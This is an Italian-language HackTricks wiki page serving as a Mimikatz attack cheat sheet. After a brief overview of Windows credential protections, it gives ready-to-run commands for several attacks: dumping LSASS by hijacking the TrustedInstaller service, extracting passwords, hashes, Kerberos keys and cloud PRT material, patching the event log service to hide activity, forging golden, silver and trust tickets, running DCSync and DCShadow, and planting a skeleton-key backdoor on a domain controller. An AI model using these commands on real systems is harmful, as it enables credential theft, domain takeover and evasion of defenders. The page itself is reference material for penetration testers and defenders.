# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Questa pagina si basa su una di [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Controlla l'originale per ulteriori informazioni!

## LM and Clear-Text in memory

A partire da Windows 8.1 e Windows Server 2012 R2, sono state implementate misure significative per proteggersi dal furto di credenziali:

- Gli hash **LM** e le password in testo semplice non vengono più memorizzati in memoria per migliorare la sicurezza. Un'impostazione specifica del registro, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ deve essere configurata con un valore DWORD di `0` per disabilitare Digest Authentication, garantendo che le password in "clear-text" non vengano memorizzate nella cache in LSASS.

- **LSA Protection** viene introdotta per proteggere il processo Local Security Authority (LSA) dalla lettura non autorizzata della memoria e dall'iniezione di codice. Questo si ottiene marcando LSASS come processo protetto. L'attivazione di LSA Protection comporta:
1. Modificare il registro in _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ impostando `RunAsPPL` su `dword:00000001`.
2. Implementare un Group Policy Object (GPO) che imponga questa modifica del registro su tutti i dispositivi gestiti.

Nonostante queste protezioni, strumenti come Mimikatz possono aggirare LSA Protection usando driver specifici, anche se tali azioni probabilmente verranno registrate nei log degli eventi.

Sulle workstation moderne questo è ancora più rilevante perché **Credential Guard è abilitato per impostazione predefinita su molti sistemi Windows 11 22H2+ e Windows Server 2025 domain-joined, non-DC**, mentre **LSASS-as-PPL è abilitato per impostazione predefinita sulle installazioni nuove di Windows 11 22H2+**. In pratica, questo significa che `sekurlsa::logonpasswords` spesso restituisce meno materiale rispetto a quanto previsto dalle tecniche più vecchie e gli operatori si spostano sempre più verso **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)** o moduli orientati a **CloudAP/PRT**. Per la parte di protezione, vedi [Windows credentials protections](credentials-protections.md).

### Counteracting SeDebugPrivilege Removal

Gli amministratori hanno in genere SeDebugPrivilege, che consente di fare il debug dei programmi. Questo privilegio può essere limitato per prevenire dump non autorizzati della memoria, una tecnica comune usata dagli attacker per estrarre credenziali dalla memoria. Tuttavia, anche con questo privilegio rimosso, l'account TrustedInstaller può ancora eseguire memory dumps usando una configurazione del servizio personalizzata:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Ciò consente di eseguire il dump della memoria di `lsass.exe` in un file, che può poi essere analizzato su un altro sistema per estrarre le credenziali:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

Il tampering dei log eventi in Mimikatz coinvolge due azioni principali: cancellare i log eventi e patchare il servizio Event per impedire la registrazione di nuovi eventi. Di seguito i comandi per eseguire queste azioni:

#### Clearing Event Logs

- **Command**: Questa azione è finalizzata a eliminare i log eventi, rendendo più difficile tracciare attività malevole.
- Mimikatz non fornisce un comando diretto nella documentazione standard per cancellare i log eventi direttamente dalla sua command line. Tuttavia, la manipolazione dei log eventi in genere coinvolge l’uso di strumenti di sistema o script esterni a Mimikatz per cancellare log specifici (ad es. usando PowerShell o Windows Event Viewer).

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- Questo comando sperimentale è progettato per modificare il comportamento del Event Logging Service, impedendogli di registrare nuovi eventi.
- Example: `mimikatz "privilege::debug" "event::drop" exit`

- Il comando `privilege::debug` assicura che Mimikatz operi con i privilegi necessari per modificare i servizi di sistema.
- Il comando `event::drop` poi patcha il servizio Event Logging.

### Kerberos Ticket Attacks

Usa i comandi qui sotto come promemoria rapido della sintassi. Le pagine dedicate per [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md), e [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) contengono i dettagli aggiornati su AES/PAC/opsec.

### Golden Ticket Creation

Un Golden Ticket consente l’impersonificazione con accesso a livello di intero dominio. Comando e parametri principali:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: Il nome del dominio.
- `/sid`: Il Security Identifier (SID) del dominio.
- `/user`: Il nome utente da impersonare.
- `/krbtgt`: L’hash NTLM dell’account di servizio KDC del dominio.
- `/ptt`: Inietta direttamente il ticket in memoria.
- `/ticket`: Salva il ticket per un uso successivo.

Example:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Creazione di Silver Ticket

I Silver Ticket concedono accesso a servizi specifici. Comando e parametri chiave:

- Comando: simile al Golden Ticket ma prende di mira servizi specifici.
- Parametri:
- `/service`: il servizio da prendere di mira (ad es. cifs, http).
- Altri parametri simili al Golden Ticket.

Esempio:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Creazione di Trust Ticket

I Trust Tickets vengono usati per accedere a risorse tra domini sfruttando le relazioni di trust. Comando e parametri principali:

- Command: Simile a Golden Ticket ma per le relazioni di trust.
- Parameters:
- `/target`: L'FQDN del dominio di destinazione.
- `/rc4`: L'hash NTLM per l'account di trust.

Example:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Additional Kerberos Commands

- **Listing Tickets**:

- Command: `kerberos::list`
- Elenca tutti i ticket Kerberos per la sessione utente corrente.

- **Pass the Cache**:

- Command: `kerberos::ptc`
- Inietta i ticket Kerberos dai file di cache.
- Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Command: `kerberos::ptt`
- Consente di usare un ticket Kerberos in un'altra sessione.
- Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**:
- Command: `kerberos::purge`
- Cancella tutti i ticket Kerberos dalla sessione.
- Utile prima di usare i comandi di manipolazione dei ticket per evitare conflitti.

### Over-Pass-the-Hash / Pass-the-Key

Se `RC4` è disabilitato o inaffidabile, Mimikatz può patchare le chiavi Kerberos **AES128/AES256** nella sessione di logon corrente invece di usare solo un hash NT. Di solito è più adatto ai domain moderni rispetto a trattare `sekurlsa::pth` come solo NTLM.
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` riutilizza il processo corrente invece di avviare una nuova console, il che è utile quando vuoi eseguire subito cose come `lsadump::dcsync` nello stesso contesto.

### Active Directory Tampering

- **DCShadow**: Fa temporaneamente agire una macchina come un DC per la manipolazione degli oggetti AD. Vedi [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Imita un DC per richiedere dati delle password. Vedi [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Credential Access

- **LSADUMP::LSA**: Estrae credenziali da LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Si finge un DC usando i dati della password di un account computer.

- _Nessun comando specifico fornito per NetSync nel contesto originale._

- **LSADUMP::SAM**: Accede al database SAM locale.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Decripta i secret memorizzati nel registro.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Imposta un nuovo hash NTLM per un utente.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Recupera le informazioni di autenticazione dei trust.
- `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

Su host **Entra ID** o **hybrid-joined**, `sekurlsa::cloudap` può esporre materiale cache del **Primary Refresh Token (PRT)** da LSASS. Se la chiave Proof-of-Possession associata è protetta via software, `dpapi::cloudapkd` può derivare il materiale chiave chiaro/derivato necessario per i workflow successivi di **Pass-the-PRT**.
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
Questo diventa molto più difficile quando la chiave è supportata da TPM, ma vale la pena controllare sugli endpoint ibridi perché i dati CloudAP in cache potrebbero essere più interessanti del classico output di `wdigest`. Per la chain di abuso lato cloud, vedi [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).

### Miscellaneous

- **MISC::Skeleton**: Inietta una backdoor in LSASS su un DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: Ottieni i diritti di backup.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Ottieni i privilegi di debug.
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: Mostra le credenziali degli utenti connessi.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Estrai i ticket Kerberos dalla memoria.
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid and Token Manipulation

- **SID::add/modify**: Modifica SID e SIDHistory.

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _Nessun comando specifico per modify nel contesto originale._

- **TOKEN::Elevate**: Impersona i token.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Consenti più sessioni RDP.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Elenca le sessioni TS/RDP.
- _Nessun comando specifico fornito per TS::Sessions nel contesto originale._

### Vault

- Estrai le password da Windows Vault.
- `mimikatz "vault::cred /patch" exit`


## References

- [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)

{{#include ../../banners/hacktricks-training.md}}
